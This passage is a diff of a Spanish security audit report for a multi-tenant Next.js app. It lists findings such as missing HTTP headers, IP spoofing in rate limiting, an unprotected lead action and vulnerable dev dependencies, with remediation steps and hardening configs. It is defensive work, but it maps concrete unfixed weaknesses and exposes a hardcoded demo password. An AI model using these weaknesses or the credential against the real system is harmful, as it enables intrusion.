-**Descripción:** La contraseña de demo `Domio2026!` está hardcoded con un comentario `// demo password for dev seed`. Aunque el ESLint marca esto con `sonarjs/no-hardcoded-passwords` y se suprime con `eslint-disable`, el riesgo es que esta contraseña pueda acabar siendo usada por usuarios reales o que el seed se ejecute en entornos non-dev.
-
-**Remediación:** Leer la contraseña de seed desde una variable de entorno (`SEED_DEMO_PASSWORD`) y fallar explícitamente si no está definida. Alternativamente, generar un token aleatorio en el seed y mostrarlo en la salida de consola.
-
----
-
-### [LOW-03] Endpoint `/api/health` sin autenticación expone información de estado del servicio
-
-**Categoría OWASP 2025:** A02:2025 — Security Misconfiguration
-**Severidad:** Baja
-**Archivos afectados:** `app/api/health/route.ts`
-
-**Descripción:** El endpoint `/api/health` devuelve `{ status: "ok" }` sin autenticación. En sí mismo esto es una práctica válida para health checks de infraestructura. Sin embargo, si en el futuro se amplía para incluir información de versión, estado de base de datos o métricas del sistema, esta información podría ser aprovechada por atacantes para reconnaissance. Actualmente el riesgo es mínimo.
-
-**Remediación:** Documentar que este endpoint debe permanecer mínimo (solo status OK/error) y nunca incluir información de versión, stack traces o métricas de sistema.
-
----
-
-## 5. Hallazgos Informativos
-
-### [INFO-01] `trustHost: true` en NextAuth puede aceptar requests de hosts no esperados
-
-**Categoría OWASP 2025:** A02:2025 — Security Misconfiguration
-**Archivos afectados:** `src/infrastructure/auth/auth.config.ts` (línea 116)
-
-**Descripción:** `trustHost: true` en NextAuth desactiva la validación del header `Host` de la request. Esto es necesario en algunos deployments (Vercel, Cloudflare), pero significa que si el servidor está mal configurado a nivel de routing, podría aceptar requests de hosts no esperados. El riesgo real depende de la configuración de infraestructura.
-
-**Recomendación:** Verificar que `AUTH_URL` esté correctamente configurado en producción y que el servidor no acepte tráfico de hosts arbitrarios.
-
----
-
-### [INFO-02] Ausencia de pnpm audit en CI
+### [MED-04] Dependencias con vulnerabilidades conocidas (CVE)
 
 **Categoría OWASP 2025:** A03:2025 — Software Supply Chain Failures
-**Archivos afectados:** `.github/workflows/ci.yml`
+**Severidad:** Media
+**Explotabilidad:** Difícil (dependencias de desarrollo en su mayoría)
+**Archivos afectados:** `package.json`, `pnpm-lock.yaml`
 
-**Descripción:** El pipeline de CI ejecuta lint, typecheck, tests y build, pero no incluye `pnpm audit` para detectar dependencias con CVEs conocidos. `next-auth@4.24.14` es la versión final del branch 4.x; el equipo debería tener visibilidad sobre futuras vulnerabilidades publicadas.
+**Descripción:** `pnpm audit` identifica las siguientes vulnerabilidades:
 
-**Recomendación:** Añadir `pnpm audit --prod` como paso en CI con al menos nivel `high` de fallo. Considerar la migración a Auth.js v5 (Next-Auth v5) que está siendo mantenido activamente y es compatible con Next.js 15.
+| Paquete | Versión | CVE/Advisory | Severidad | Ruta |
+|---------|---------|--------------|-----------|------|
+| minimatch | 10.1.2 | CVE-2026-26996, CVE-2026-27903, CVE-2026-27904 | High | eslint-plugin-sonarjs > minimatch (dev) |
+| esbuild | 0.18.20 | GHSA-67mh-4wv8-2f99 | Moderate | drizzle-kit > @esbuild-kit/* > esbuild (dev) |
+| postcss | (various) | (review) | — | next > postcss |
+| uuid | (various) | (review) | — | next-auth > uuid |
+
+Las vulnerabilidades de minimatch son ReDoS (Denial of Service) en patrones glob controlados por el usuario. Al ser dependencias de desarrollo (eslint-plugin-sonarjs, drizzle-kit), el riesgo en producción es bajo pero no nulo si los patrones glob se construyen con input de usuario en CI/CD.
+
+**Remediación:**
+```bash
+pnpm update minimatch --recursive
+pnpm update eslint-plugin-sonarjs
+```
+
+**Coste fix:** Bajo (30min)
+
+---
+
+## 5. Hallazgos Bajos
+
+### [LOW-01] Endpoint `/api/health` expone variable de entorno `APP_ENV`
+
+**Archivos:** `app/api/health/route.ts`
+**Descripción:** El endpoint público de health retorna `{ status: "ok", env: APP_ENV }`, revelando si la instancia es local, development o production. Información útil para un atacante que busca identificar el entorno.
+**Remediación:** Retornar solo `{ status: "ok" }` o proteger detrás de un header secreto.
+**Coste fix:** Muy Bajo (5min)
+
+---
+
+### [LOW-02] Error messages en revalidate exponen detalles internos
+
+**Archivos:** `app/api/internal/revalidate/route.ts:46-49`
+**Descripción:** El catch del endpoint revalidate retorna `String(error)` que puede incluir stack traces o mensajes de error internos.
+```ts
+return NextResponse.json(
+  { revalidated: false, error: String(error) },
+  { status: 500 },
+);
+```
+**Remediación:** Retornar un mensaje genérico y loguear el error completo internamente.
+**Coste fix:** Muy Bajo (5min)
+
+---
+
+### [LOW-03] Consent cookie con `sameSite: "lax"` en lugar de `"strict"`
+
+**Archivos:** `src/features/engagement/server/consent-actions.ts:13-19`
+**Descripción:** La cookie de consentimiento usa `sameSite: "lax"`. Aunque es aceptable, `sameSite: "strict"` sería más seguro para una cookie que no necesita ser enviada en navigations cross-origin.
+**Remediación:** Cambiar a `sameSite: "strict"` si el flujo de UX lo permite.
+**Coste fix:** Muy Bajo (5min)
 
 ---
 
@@ -467,16 +379,16 @@ const [promocion] = await tx
 
 | # | Categoría | Estado | Hallazgos |
 |---|-----------|--------|-----------|
-| A01:2025 | Broken Access Control | ⚠️ | MED-04 (lead sin filtro tenant) |
-| A02:2025 | Security Misconfiguration | ⚠️ | MED-01 (headers), LOW-03, INFO-01 |
-| A03:2025 | Software Supply Chain Failures | ⚠️ | INFO-02 (audit ausente en CI) |
-| A04:2025 | Cryptographic Failures | ✅ | bcrypt 12 rounds, tokens criptográficamente seguros. LOW-02 menor |
-| A05:2025 | Injection | ⚠️ | HIGH-03 (XSS atributos HTML), MED-03 (MIME cliente) |
-| A06:2025 | Insecure Design | ⚠️ | HIGH-01 (rate limit login desconectado), MED-02, LOW-01 |
-| A07:2025 | Authentication Failures | ⚠️ | HIGH-01 (brute force posible), HIGH-02 (validación JWT superficial) |
-| A08:2025 | Data Integrity Failures | ✅ | Historial de cambios, consentimientos inmutables, validación Zod |
-| A09:2025 | Security Logging & Alerting Failures | ✅ | Sentry configurado con scrubbing de secrets, logger disponible |
-| A10:2025 | Mishandling of Exceptional Conditions | ⚠️ | MED-02 (rate limit fail-open sin RATE_LIMIT_STORE_URL) |
+| A01:2025 | Broken Access Control | ⚠️ | HIGH-03 (IP spoofing en rate limiting). Multi-tenancy bien implementado con RLS + contextos. |
+| A02:2025 | Security Misconfiguration | ❌ | HIGH-02 (sin headers de seguridad), LOW-01 (health expone env), LOW-02 (error messages). |
+| A03:2025 | Software Supply Chain Failures | ⚠️ | MED-04 (minimatch ReDoS, esbuild CORS). Dependencias de dev principalmente. |
+| A04:2025 | Cryptographic Failures | ✅ | Passwords con bcrypt, API keys con bcrypt + hash, secrets en env vars, cookies con flags adecuadas. |
+| A05:2025 | Injection | ⚠️ | MED-02 (sanitización HTML permite `style`). SQL injection mitigado por Drizzle ORM parametrizado. |
+| A06:2025 | Insecure Design | ❌ | HIGH-01 (server action sin CAPTCHA/rate limit), HIGH-04 (revalidate tags arbitrarios). |
+| A07:2025 | Authentication Failures | ⚠️ | MED-01 (JWT sin invalidación). Login con bcrypt + rate limiting + Turnstile. Session con expiración. |
+| A08:2025 | Data Integrity Failures | ✅ | API keys verificadas con bcrypt, webhooks no expuestos, validación Zod en todas las entradas. |
+| A09:2025 | Security Logging & Alerting Failures | ⚠️ | MED-03 (sin logs de seguridad estructurados). Sentry configurado con sanitización de secrets. |
+| A10:2025 | Mishandling of Exceptional Conditions | ✅ | Fail-close en auth (getServerSession retorna null en error), Turnstile fail-close en producción, rate limiting degrade gracefully. |
 
 ---
 
@@ -485,162 +397,134 @@ const [promocion] = await tx
 ### Endpoints públicos (sin autenticación)
 | Ruta | Método | Validación | Rate Limiting |
 |------|--------|------------|---------------|
-| `/` | GET | N/A (SSR) | No |
-| `/inmuebles/[slug]` | GET | slug por DB | No |
-| `/portafolio` | GET | N/A | No |
-| `/contacto` | GET | N/A | No |
-| `/api/health` | GET | Ninguna | No |
+| `/api/health` | GET | Ninguna | Ninguno |
+| `/api/v1/promociones` | GET | API Key (bcrypt) | Por API key (configurable) |
+| `/api/v1/leads/institutional` | POST | API Key (bcrypt) + Zod | Por API key (configurable) |
 
-### Server Actions públicas
-| Acción | Validación input | Rate Limiting |
-|--------|-----------------|---------------|
-| `submitContactForm` | Zod + trim | Sí (contact scope) |
-| `createLeadAction` (engagement) | Zod + UUID | Sí (contact scope) |
-| `createLeadAction` (leads) | Zod | No |
-
-### Endpoints autenticados — API Key
-| Ruta | Método | Auth | Rate Limiting |
-|------|--------|------|---------------|
-| `/api/v1/promociones` | GET | API Key (bcrypt) | Sí (por key) |
-| `/api/v1/leads/institutional` | POST | API Key (bcrypt) | Sí (por key) |
-
-### Endpoints autenticados — Sesión JWT
+### Endpoints autenticados (sesión)
 | Ruta | Método | Auth | Control de acceso |
 |------|--------|------|-------------------|
-| `/api/internal/promociones` | GET, POST | Session | Auth only |
-| `/api/internal/promociones/[id]` | GET, PATCH, DELETE | Session | AGENT scope en GET/PATCH |
-| `/api/internal/media/upload` | POST | Session | Auth only |
-| `/api/internal/content/blocks` | GET, POST | Session | ADMIN+OPERATOR only |
-| `/api/internal/revalidate` | POST | Session | Auth only |
-| `/api/internal/docs` | GET | Session | Auth only |
+| `/api/internal/promociones` | GET, POST | requireAuth | Por tenant (RLS) |
+| `/api/internal/promociones/[id]` | GET, PATCH, DELETE | requireAuth | AGENT: solo asignadas. ADMIN/OPERATOR: todas. |
+| `/api/internal/promociones/[id]/draft` | PATCH, DELETE | requireAuth | AGENT: solo asignadas. |
+| `/api/internal/promociones/[id]/history` | GET | requireAuth | AGENT: solo asignadas. |
+| `/api/internal/media/upload` | POST | requireAuth | Por tenant (RLS) |
+| `/api/internal/content/blocks` | GET, POST | requireAuth + ADMIN/OPERATOR | Por tenant |
+| `/api/internal/content/contact` | GET, PUT | requireAuth + ADMIN/OPERATOR | Por tenant |
+| `/api/internal/content/history` | GET | requireAuth + ADMIN/OPERATOR | Por tenant |
+| `/api/internal/content/revert` | POST | requireAuth + ADMIN/OPERATOR | Por tenant |
+| `/api/internal/leads/unread-count` | GET | requireAuth | Por tenant (RLS) |
+| `/api/internal/revalidate` | POST | requireAuth | ⚠️ Sin restricción de rol ni tags |
+| `/api/internal/docs` | GET | requireAuth | Ninguno (genera OpenAPI) |
+
+### Server actions públicos (sin autenticación)
+| Action | Protecciones |
+|--------|-------------|
+| `submitContactForm` (contact) | Turnstile ✅ + Rate limit IP ✅ + Zod ✅ |
+| `createLeadAction` (engagement) | Turnstile ✅ + Rate limit IP ✅ + Zod ✅ |
+| `createLeadAction` (leads.actions) | ⚠️ Sin Turnstile ❌ + Sin rate limit ❌ + Zod ✅ |
+
+### Server actions autenticados
+| Action | Auth | Control de acceso |
+|--------|------|-------------------|
+| `saveContentBlock` | getServerSession | ADMIN + OPERATOR |
+| `getUsersAction`, `createUserAction`, `updateUserAction`, `deactivateUserAction` | requireAdmin | Solo ADMIN |
+| `getApiKeysAction`, `createApiKeyAction`, `revokeApiKeyAction` | requireAdmin | Solo ADMIN |
+| `exportLeadAction`, `deleteLeadAction` | getServerSession | Solo ADMIN |
+| `getLeadsAction`, `getLeadDetailAction`, `addNoteAction`, `markAsReadAction`, `updateLeadStatusAction` | getServerSession | Por tenant (RLS) |
+| `reassignLeadAction` | getServerSession | Solo ADMIN |
+| `exportLeadsCsvAction` | getServerSession | Por tenant (RLS) |
 
 ### Datos sensibles gestionados
-- **Contraseñas**: bcrypt hash con cost 10 (seed) / 12 (producción). Nunca logueadas.
-- **API Keys**: bcrypt hash con cost 12. Plain key mostrado solo en creación.
-- **Tokens de invitación**: SHA-256 hash. TTL 48h.
-- **PII leads**: email, nombre, teléfono en PostgreSQL con RLS. No cifrado at-rest (depende de configuración de Neon/postgres).
-- **Coordenadas de inmuebles**: sanitizadas en modo AREA antes de serializar al cliente.
-- **Sesión JWT**: cookie `next-auth.session-token`. Flags de seguridad: gestionados por NextAuth (HttpOnly, Secure en prod). No se verifican explícitamente en el código de aplicación.
+| Tipo | Almacenamiento | Transmisión |
+|------|---------------|-------------|
+| Passwords | bcrypt hash en `users.password_hash` | Solo en login (POST body) |
+| PII (nombre, email, teléfono) | PostgreSQL con RLS por tenant | HTTPS (forzado por plataforma) |
+| API keys | bcrypt hash en `api_keys.key_hash` | Header (X-API-Key / Bearer) |
+| Session tokens | JWT cookie (httpOnly, secure en prod) | Cookie con SameSite |
+| Consent records | PostgreSQL con RLS | Solo lectura interna |
+| IP addresses | Texto plano en `consent_records.ip` | Solo escritura (no se expone) |
+| RGPD data | `consent_records` (inmutable por diseño) | Solo lectura admin |
 
 ---
 
 ## 8. Dependencias con Vulnerabilidades
 
-No se encontraron CVEs conocidos en las versiones específicas instaladas mediante inspección del lock file. Las versiones usadas son:
-- `next@15.5.20` — rama 15.x activa
-- `next-auth@4.24.14` — versión final del branch 4.x (no recibe más parches)
-- `drizzle-orm@0.45.2` — reciente
-- `@sentry/nextjs@10.64.0` — reciente
+| Paquete | Versión | CVE / Advisory | Severidad | Fix disponible |
+|---------|---------|----------------|-----------|----------------|
+| minimatch | 10.1.2 | CVE-2026-26996 (ReDoS) | High | >= 10.2.1 |
+| minimatch | 10.1.2 | CVE-2026-27903 (ReDoS) | High (CVSS 7.5) | >= 10.2.3 |
+| minimatch | 10.1.2 | CVE-2026-27904 | High | >= 10.2.3 |
+| esbuild | 0.18.20 | GHSA-67mh-4wv8-2f99 (CORS en dev) | Moderate (CVSS 5.3) | >= 0.25.0 |
+| postcss | (various) | Review pending | — | Update recommended |
+| uuid | (various) | Review pending | — | Update recommended |
 
-**Riesgo residual:** `next-auth@4` está en modo mantenimiento. Nuevas vulnerabilidades en esta rama pueden no recibir parches. Se recomienda planificar la migración a Auth.js v5.
-
-| Paquete | Versión | CVE | Severidad | Fix disponible |
-|---------|---------|-----|-----------|----------------|
-| next-auth | 4.24.14 | Ninguno conocido actualmente | — | Migrar a v5 |
+**Nota:** Todas las vulnerabilidades de minimatch son en dependencias de desarrollo (eslint-plugin-sonarjs). El riesgo en producción es bajo pero debe remediarse para proteger el pipeline de CI/CD.
 
 ---
 
 ## 9. Plan de Remediación
 
 ### Inmediato (antes del próximo release)
-- [ ] **[HIGH-01]** Conectar `checkLoginRateLimit` al flujo de login — 2-4h
-- [ ] **[HIGH-03]** Ampliar validación HTML para rechazar atributos event-handler y `javascript:` — 2-4h
+- [ ] [HIGH-01] Eliminar o proteger `createLeadAction` en `leads.actions.ts` — 1h
+- [ ] [HIGH-04] Restringir tags y rol en `/api/internal/revalidate` — 1h
+- [ ] [HIGH-02] Añadir headers de seguridad HTTP en `next.config.ts` — 2h
 
 ### Corto plazo (próximas 2 semanas)
-- [ ] **[HIGH-02]** Reemplazar validación de formato JWT en middleware por `getToken()` de NextAuth — 1-2h
-- [ ] **[MED-01]** Añadir headers de seguridad en `next.config.ts` — 3-5h
-- [ ] **[MED-04]** Añadir filtro de `tenantId` y `status=PUBLISHED` en query de promoción del lead público — 30min
+- [ ] [HIGH-03] Corregir IP extraction para prevenir spoofing — 2h
+- [ ] [MED-01] Implementar invalidación de JWT tras desactivación de usuario — 4h
+- [ ] [MED-02] Eliminar atributo `style` del allowlist HTML — 2h
+- [ ] [MED-04] Actualizar dependencias con CVEs — 30min
 
 ### Medio plazo (próximo mes)
-- [ ] **[MED-02]** Implementar fallback de rate limiting en memoria para producción sin Redis — 2-3h
-- [ ] **[MED-03]** Añadir validación de magic bytes en upload de media — 2-4h
-- [ ] **[INFO-02]** Añadir `pnpm audit` al pipeline CI — 30min
-- [ ] **[LOW-01]** Documentar requisito de proxy de confianza para headers de IP — 1h
+- [ ] [MED-03] Implementar audit logging para eventos de seguridad — 8-16h
+- [ ] [LOW-01] Ocultar `APP_ENV` del health endpoint — 5min
+- [ ] [LOW-02] Sanitizar error messages en revalidate — 5min
 
 ### Monitorizar / Aceptar
-- **[LOW-02]** Contraseña de seed — aceptable para dev, añadir env var para mayor robustez
-- **[LOW-03]** Health endpoint — monitorizar que no se expanda sin autenticación
-- **[INFO-01]** `trustHost: true` — aceptable si el deployment usa Vercel/Cloudflare correctamente
+- [LOW-03] Consent cookie `sameSite: lax` — aceptable, mejorar si UX lo permite
+- Dependencias `postcss` y `uuid` — monitorizar advisories futuros
 
 ---
 
 ## 10. Configuraciones de Seguridad Recomendadas
 
-### Headers de Seguridad (next.config.ts)
-
+### Headers de seguridad (next.config.ts)
 ```ts
-const securityHeaders = [
-  { key: "X-DNS-Prefetch-Control", value: "on" },
-  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
-  { key: "X-Frame-Options", value: "SAMEORIGIN" },
-  { key: "X-Content-Type-Options", value: "nosniff" },
-  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), interest-cohort=()" },
-  {
-    key: "Content-Security-Policy",
-    value: [
-      "default-src 'self'",
-      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",  // Next.js requiere esto
-      "style-src 'self' 'unsafe-inline'",
-      "img-src 'self' blob: data: https:",
-      "font-src 'self'",
-      "object-src 'none'",
-      "base-uri 'self'",
-      "form-action 'self'",
-      "frame-ancestors 'none'",
-      "upgrade-insecure-requests",
-    ].join("; "),
-  },
-];
+async headers() {
+  return [
+    {
+      source: "/(.*)",
+      headers: [
+        { key: "X-Frame-Options", value: "DENY" },
+        { key: "X-Content-Type-Options", value: "nosniff" },
+        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+        { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
+        { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
+      ],
+    },
+  ];
+},
 ```
 
-### Middleware con verificación JWT real
-
-```ts
-import { getToken } from "next-auth/jwt";
-import { NextResponse } from "next/server";
-import type { NextRequest } from "next/server";
-
-export async function middleware(request: NextRequest) {
-  const { pathname } = request.nextUrl;
-
-  if (pathname.startsWith("/panel") && !pathname.startsWith("/panel/login")) {
-    const token = await getToken({
-      req: request,
-      secret: process.env.AUTH_SECRET,
-    });
-
-    if (!token) {
-      return NextResponse.redirect(new URL("/panel/login", request.url));
-    }
-  }
-
-  if (pathname.startsWith("/panel") || pathname.startsWith("/api/internal")) {
-    const response = NextResponse.next();
-    response.headers.set("X-Robots-Tag", "noindex, nofollow");
-    response.headers.set("x-pathname", pathname);
-    return response;
-  }
-
-  return NextResponse.next();
-}
+### Content-Security-Policy (evaluar)
+```
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://cdn.domio.com https://images.unsplash.com; font-src 'self'; connect-src 'self' https://challenges.cloudflare.com https://*.sentry.io; frame-ancestors 'none';
 ```
 
-### Validación HTML con atributos seguros
+### Cookies de sesión (ya configuradas correctamente)
+- `httpOnly: true` ✅
+- `secure: true` en producción ✅
+- `sameSite: "lax"` ✅
+- `maxAge: 7200` (2 horas) ✅
 
-```ts
-const DANGEROUS_ATTR_PATTERN = /\bon\w+\s*=|\bjavascript\s*:|\bdata\s*:/i;
+### Rate limiting (ya implementado)
+- Login: 5 intentos / 15 min + lockout 15 min ✅
+- Contacto: 3 envíos / 10 min + lockout 15 min ✅
+- API keys: configurable por key (default 60/min) ✅
 
-function validateAllowedHtml(value: string): boolean {
-  // Rechazar atributos peligrosos antes de extraer tags
-  if (DANGEROUS_ATTR_PATTERN.test(value)) return false;
-
-  const tagRegex = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi;
-  let match: RegExpExecArray | null;
-  while ((match = tagRegex.exec(value)) !== null) {
-    const tagName = match[1]!.toLowerCase();
-    if (!ALLOWED_HTML_TAGS_SET.has(tagName)) return false;
-  }
-  return true;
-}
-```
+### Multi-tenancy (bien implementado)
+- RLS en todas las tablas de dominio ✅
+- `SET LOCAL` (transaction-scoped) para `app.current_tenant_id` ✅
+- Contextos tipados: `PublicContext`, `AuthenticatedContext`, `ApiKeyContext` ✅
+- Políticas de aislamiento por tenant en todas las tablas ✅
